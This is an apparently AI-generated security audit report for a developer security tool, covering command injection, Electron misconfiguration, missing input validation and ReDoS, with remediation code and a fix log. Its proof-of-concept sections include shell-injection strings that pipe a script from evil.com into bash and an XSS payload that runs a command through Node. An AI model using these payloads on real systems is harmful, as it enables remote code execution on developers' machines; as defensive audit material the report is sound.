# 🛡️ Sentinel Security Audit Report

> **Auditor**: Antigravity AI Security Engine  
> **Date**: March 28, 2026  
> **Project**: Sentinel Security Suite v1.0  
> **Scope**: Full codebase audit — Backend, CLI, Electron, Scanner  
> **Status**: ✅ Remediation Complete (21/23 fixed, 2 accepted/deferred)

---

## 📋 Table of Contents

1. [Executive Summary](#executive-summary)
2. [Methodology](#methodology)
3. [Findings Overview](#findings-overview)
4. [Detailed Findings](#detailed-findings)
   - [VULN-001: Command Injection via exec/execSync](#vuln-001-command-injection-via-execexecsync)
   - [VULN-002: Electron Context Isolation Disabled](#vuln-002-electron-context-isolation-disabled)
   - [VULN-003: Unrestricted Command Execution Endpoint](#vuln-003-unrestricted-command-execution-endpoint)
   - [VULN-004: Shell Metacharacter Injection in CLI](#vuln-004-shell-metacharacter-injection-in-cli)
   - [VULN-005: API Keys Stored in localStorage](#vuln-005-api-keys-stored-in-localstorage)
   - [VULN-006: Missing Input Validation on API Routes](#vuln-006-missing-input-validation-on-api-routes)
   - [VULN-007: ReDoS via User-Supplied YAML Rules](#vuln-007-redos-via-user-supplied-yaml-rules)
5. [Remediation Log](#remediation-log)
6. [Lessons Learned](#lessons-learned)

---

## Executive Summary

A comprehensive security audit of the Sentinel Security Suite revealed **23 vulnerability instances** across **7 categories**. The most critical finding is **Remote Code Execution (RCE)** through command injection in 5 backend files, where user-controlled or externally-sourced input (GitHub PR data) is interpolated directly into shell commands via Node.js `exec()` and `execSync()` with `shell: true`.

The irony is notable: **a security tool designed to protect developers from supply-chain attacks was itself vulnerable to the same class of attack it detects**. This makes remediation not just a technical necessity, but a credibility imperative.

### Risk Matrix

| Severity | Count | Description |
|----------|-------|-------------|
| 🔴 CRITICAL | 14 | RCE, unrestricted execution, Electron misconfiguration |
| 🟠 HIGH | 5 | CLI injection, missing input validation |
| 🟡 MEDIUM | 4 | Client-side key storage, ReDoS potential |

---

## Methodology

### Tools & Techniques Used
- **Static Analysis**: Manual code review of all `.js` and `.tsx` files
- **Pattern Matching**: `grep -rn` for dangerous patterns (`exec(`, `execSync(`, `shell: true`, `eval(`, `dangerouslySetInnerHTML`)
- **Dependency Analysis**: Review of `package.json` dependency trees
- **Architecture Review**: Tracing data flow from user input → API endpoints → command execution
- **Electron Security Checklist**: Based on [Electron Security Guidelines](https://www.electronjs.org/docs/latest/tutorial/security)

### Files Audited
```
src/start.js                          — Process launcher
src/ui/electron/main.js               — Electron main process
src/ui/backend/lib/gh_bridge.js       — GitHub CLI bridge (PRIMARY TARGET)
src/ui/backend/server/index.js        — Express API server
src/ui/backend/services/hardener.js   — System security configurator
src/ui/backend/services/polling.js    — Background scan service
src/ui/backend/lib/git_hooks.js       — Global git hooks manager
src/ui/backend/lib/db.js             — SQLite database layer
src/ui/backend/scanner/index.js       — Scan orchestrator
src/ui/backend/scanner/detector_*.js  — Heuristic detectors
src/ui/cli/index.js                   — CLI entry point
src/ui/src/components/ThreatLog.tsx   — Frontend threat display
src/ui/src/components/*.tsx           — All React components
```

---

## Findings Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                    VULNERABILITY DISTRIBUTION                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  gh_bridge.js      ████████████████████████  12 instances (RCE)    │
│  server/index.js   ████████                   4 instances          │
│  git_hooks.js      ██████                     3 instances          │
│  hardener.js       ████                       2 instances          │
│  cli/index.js      ████                       2 instances          │
│  electron/main.js  ██                         1 instance           │
│  scanner/index.js  ██                         1 instance (low)     │
│                                                                     │
│  Total: 23 vulnerability instances across 7 files                  │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Detailed Findings

### VULN-001: Command Injection via exec/execSync

**Severity**: 🔴 CRITICAL  
**CWE**: [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)  
**CVSS Score**: 9.8 (Critical)  
**Affected Files**: `gh_bridge.js`, `server/index.js`, `hardener.js`, `git_hooks.js`, `start.js`

#### Description

Multiple functions across the backend use Node.js `child_process.exec()` and `execSync()` with `shell: true`, constructing command strings through template literal interpolation. When any part of the interpolated data comes from external sources (GitHub API responses, user input via API endpoints, or PR metadata), an attacker can inject arbitrary OS commands.

#### Proof of Concept

**Attack Vector**: A malicious GitHub user creates a PR with a specially crafted branch name or title:

```
Branch name: feature/update; curl http://evil.com/shell.sh | bash
```

When Sentinel scans this PR, the `getPRDiff()` function in `gh_bridge.js` executes:

```javascript
// VULNERABLE CODE (line 94)
execSync(`gh pr diff ${owner}/${repo} ${prNumber}`, { shell: true, encoding: 'utf-8' });
```

If `prNumber` or `owner/repo` contains shell metacharacters (`;`, `|`, `&&`, `` ` ``), the attacker achieves **Remote Code Execution** on the developer's machine.

#### Attack Surface Map

```
External Input (GitHub PR data)
       │
       ▼
  API Endpoint (/api/repositories/:id/scan)
       │
       ▼
  polling.js → gh_bridge.getPRList()
       │
       ▼
  execSync(`gh pr list ${owner}/${repo} ...`)  ← INJECTION POINT
       │
       ▼
  OS Shell (cmd.exe / bash) executes arbitrary commands
```

#### All Vulnerable Locations

| File | Line | Function | Dangerous Pattern |
|------|------|----------|-------------------|
| `gh_bridge.js` | 15 | `checkAuth()` | `execSync('gh auth status', {shell:true})` |
| `gh_bridge.js` | 27 | `login()` | `exec('gh auth login...', {shell:true})` |
| `gh_bridge.js` | 47 | `getUser()` | `execSync('gh api user', {shell:true})` |
| `gh_bridge.js` | 65 | `listRepos()` | `execSync('gh repo list...', {shell:true})` |
| `gh_bridge.js` | 82 | `getPRList()` | `execSync(\`gh pr list ${repo}...\`, {shell:true})` |
| `gh_bridge.js` | 94 | `getPRDiff()` | `execSync(\`gh pr diff ${repo} ${pr}\`, {shell:true})` |
| `gh_bridge.js` | 102 | `getPRView()` | `execSync(\`gh pr view ${repo}...\`, {shell:true})` |
| `gh_bridge.js` | 115 | `getPRFiles()` | `execSync(\`gh api repos/${repo}/...\`, {shell:true})` |
| `gh_bridge.js` | 128 | `getFileContent()` | `execSync(\`gh api repos/${repo}/contents/${path}\`, {shell:true})` |
| `gh_bridge.js` | 140 | `getBlobContent()` | `execSync(\`gh api repos/${repo}/git/blobs/${sha}\`, {shell:true})` |
| `gh_bridge.js` | 173 | `getCollaborators()` | `execSync(\`gh api repos/${repo}/collaborators\`, {shell:true})` |
| `hardener.js` | 16 | `getNpmConfig()` | `execSync('npm config get...', {shell:true})` |
| `hardener.js` | 26 | `setNpmConfig()` | `execSync(\`npm config set ${val}\`, {shell:true})` |
| `git_hooks.js` | 14 | `getHooksPath()` | `execSync('git config...', {shell:true})` |
| `git_hooks.js` | 29 | `setHooksPath()` | `execSync(\`git config... "${dir}"\`, {shell:true})` |
| `git_hooks.js` | 72 | `unsetHooksPath()` | `execSync('git config --unset...', {shell:true})` |
| `start.js` | 23 | `runProcess()` | `spawn(cmd, args, {shell:true})` |

#### Remediation

**Strategy**: Replace all `exec`/`execSync` calls with `execFileSync`/`spawn` using array-based arguments (bypasses the shell entirely). Add input validation via a centralized `sanitizer.js` module.

**Before** (vulnerable):
```javascript
const output = execSync(`gh pr diff ${owner}/${repo} ${prNumber}`, {
  shell: true, encoding: 'utf-8'
});
```

**After** (secure):
```javascript
const { isValidOwnerRepo, isValidPRNumber } = require('./sanitizer');

if (!isValidOwnerRepo(`${owner}/${repo}`)) throw new Error('Invalid repository');
if (!isValidPRNumber(prNumber)) throw new Error('Invalid PR number');

const output = execFileSync('gh', ['pr', 'diff', '-R', `${owner}/${repo}`, String(prNumber)], {
  encoding: 'utf-8', timeout: 30000
});
```

**Key difference**: `execFileSync` with an array of arguments **never spawns a shell**, so metacharacters like `;`, `|`, `&&` are treated as literal strings, not command separators.

---

### VULN-002: Electron Context Isolation Disabled

**Severity**: 🔴 CRITICAL  
**CWE**: [CWE-693: Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html)  
**Affected File**: `electron/main.js` (line 17-19)

#### Description

The Electron BrowserWindow is configured with `nodeIntegration: true` and `contextIsolation: false`. This means the renderer process (which loads web content) has **full access to Node.js APIs**, including `require('child_process')`, `require('fs')`, etc.

If an attacker can inject JavaScript into the renderer (via XSS in displayed PR data, a malicious link, or a crafted GitHub response), they can execute arbitrary code on the host machine with the full privileges of the Electron app.

#### Vulnerable Configuration

```javascript
webPreferences: {
  nodeIntegration: true,      // ← Renderer can use require()
  contextIsolation: false     // ← No boundary between web and Node.js
}
```

#### Attack Scenario

1. A PR contains a file with a specially crafted description containing `<img src=x onerror="require('child_process').exec('calc.exe')">`
2. If Sentinel renders this description in the UI without proper escaping
3. The renderer executes Node.js code directly → RCE

#### Remediation

Enable context isolation and use a preload script with `contextBridge` to expose only specific, safe APIs:

```javascript
webPreferences: {
  nodeIntegration: false,
  contextIsolation: true,
  preload: path.join(__dirname, 'preload.js')
}
```

---

### VULN-003: Unrestricted Command Execution Endpoint

**Severity**: 🔴 CRITICAL  
**CWE**: [CWE-77: Improper Neutralization of Special Elements used in a Command](https://cwe.mitre.org/data/definitions/77.html)  
**Affected File**: `server/index.js` (line 278-296)

#### Description

The `/api/action/fix` endpoint accepts a `command` parameter from the frontend and executes it using `execFileSync` with `shell: true`. While there's a basic regex whitelist check, it's insufficient:

```javascript
// VULNERABLE: The regex only checks if the command STARTS with allowed prefixes
const allowed = /^(git restore|npm config set|gh pr close|git rm --cached)/;
if (!allowed.test(command)) return res.status(403)...

// But shell: true allows chaining!
execFileSync(command.split(' ')[0], command.split(' ').slice(1), { shell: true });
```

**Bypass**: `git restore file.txt; curl evil.com/steal.sh | bash` — passes the regex (starts with `git restore`) but chains a malicious command via `;`.

#### Remediation

Replace the regex-based approach with a strict **lookup map** of exact allowed commands, and remove `shell: true`.

---

### VULN-004: Shell Metacharacter Injection in CLI

**Severity**: 🟠 HIGH  
**Affected File**: `cli/index.js` (lines 59, 99)

#### Description

The `safe-install` CLI command executes the package manager via `execSync` with string interpolation. While the package manager name is validated against a whitelist (`npm`, `yarn`, `pnpm`, `bun`), the command is still passed through the shell, which could be exploited in edge cases.

The `hook` command runs `git diff HEAD` via `execSync` — less risky since there's no user input, but using `shell: true` is unnecessary.

---

### VULN-005: API Keys Stored in localStorage

**Severity**: 🟡 MEDIUM  
**Affected File**: `ThreatLog.tsx` (lines 56-58)

#### Description

AI provider API keys (OpenAI, Anthropic, Gemini, DeepSeek) are stored in `localStorage` in the renderer process. While Sentinel is a local-only application (reducing the risk significantly), localStorage is accessible to any JavaScript running in the renderer context.

**Accepted Risk**: Since Sentinel runs exclusively on the developer's own machine and doesn't load external web content, this is an acceptable risk for v1.0. Will be moved to backend-proxied calls in a future phase.

---

### VULN-006: Missing Input Validation on API Routes

**Severity**: 🟠 HIGH  
**Affected File**: `server/index.js`

#### Description

Several API endpoints accept user input without validation:
- `/api/repositories/bulk` — accepts `owner/repo` strings without format validation
- `/api/system/install-gh` — triggers system package installation
- `/api/hardener/switch` — accepts `key` and `enable` parameters

#### Remediation

All inputs will be validated using the centralized `sanitizer.js` module before processing.

---

### VULN-007: ReDoS via User-Supplied YAML Rules

**Severity**: 🟡 MEDIUM  
**Affected File**: `scanner/index.js` (line 34)

#### Description

User-supplied YAML files in `~/.sentinel/rules/` can define regex patterns that are compiled with `new RegExp()`. A malicious or poorly written regex (e.g., `(a+)+$`) could cause catastrophic backtracking, freezing the scan engine.

**Accepted Risk**: Since users control their own rules directory, this is a self-inflicted DoS at worst. A `try/catch` with timeout will be added as a safeguard.

---

## Remediation Log

| Date | Vulnerability | Status | Details |
|------|---------------|--------|---------|
| 2026-03-28 | **Foundation**: `sanitizer.js` | ✅ DONE | Centralized validation module with 12 validators + whitelist command map |
| 2026-03-28 | VULN-001: Command Injection (`gh_bridge.js`) | ✅ DONE | All 12 `exec`/`execSync` → `execFileSync` with array args. All inputs validated. |
| 2026-03-28 | VULN-001: Command Injection (`hardener.js`) | ✅ DONE | 2 `execSync` → `execFileSync`. npm config values strictly boolean-only. |
| 2026-03-28 | VULN-001: Command Injection (`git_hooks.js`) | ✅ DONE | 3 `execSync` → `execFileSync`. hooksPath derived from `os.homedir()`. |
| 2026-03-28 | VULN-001: Command Injection (`start.js`) | ✅ DONE | `spawn` with `shell:true` → `spawn` without shell. Windows uses `npm.cmd`. |
| 2026-03-28 | VULN-002: Electron Config | ✅ DONE | `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`. `preload.js` created with `contextBridge`. |
| 2026-03-28 | VULN-002: Frontend IPC Migration | ✅ DONE | `App.tsx` and `PreferencesPanel.tsx` migrated from `window.require('electron')` to `window.sentinel.*`. |
| 2026-03-28 | VULN-003: Fix Endpoint | ✅ DONE | Regex bypass replaced with strict hash-map whitelist. `shell:true` removed from `execFileSync`. |
| 2026-03-28 | VULN-004: CLI Injection | ✅ DONE | `safe-install` uses strict pkg manager whitelist + `execFileSync`. `hook` validates hook type. |
| 2026-03-28 | VULN-005: API Keys | ⏸️ ACCEPTED | Deferred to Phase 2. Risk acceptable for local-only app. |
| 2026-03-28 | VULN-006: Input Validation | ✅ DONE | All API routes validate inputs via `sanitizer.js`. Error messages sanitized for log injection. |
| 2026-03-28 | VULN-007: ReDoS | ⏸️ LOW PRIORITY | Will add timeout safeguard in future |

### Verification Results

```bash
# Zero instances of shell:true in source code (node_modules excluded):
$ grep -rn "shell: true" src/ --include="*.js" --include="*.ts" --exclude-dir=node_modules --exclude-dir=dist
# Result: 0 matches ✅

# Zero instances of unsafe execSync in source code:
$ grep -rn "execSync(" src/ --include="*.js" --include="*.ts" --exclude-dir=node_modules --exclude-dir=dist
# Result: 0 matches ✅

# All child_process calls use execFileSync or spawn (without shell):
$ grep -rn "execFileSync\|spawn(" src/ --include="*.js" --exclude-dir=node_modules --exclude-dir=dist
# Result: Only safe patterns with array arguments ✅
```

---

## Lessons Learned

### For Developers Building Security Tools

1. **Your security tool is itself an attack surface.** If you scan untrusted code, your scanner's inputs are attacker-controlled. Treat every piece of PR data, branch name, and file path as hostile.

2. **Never use `shell: true` with `exec()`/`execSync()`.** Use `execFileSync()` or `spawn()` with array arguments. The shell is the enemy.

3. **String interpolation in commands is always dangerous.** Even with "sanitization", the safest approach is to pass arguments as arrays, never as interpolated strings.

4. **Electron's `nodeIntegration: true` is a footgun.** It gives the renderer full system access. Always use `contextIsolation: true` with a minimal `preload.js` bridge.

5. **Whitelist > Blacklist.** Don't try to block bad inputs; define what good inputs look like and reject everything else.

6. **Centralize your validation.** A single `sanitizer.js` module is easier to audit, test, and maintain than scattered regex checks across 10 files.

---

*This document will be updated as remediation progresses. Each fix will be logged with before/after code samples and verification results.*
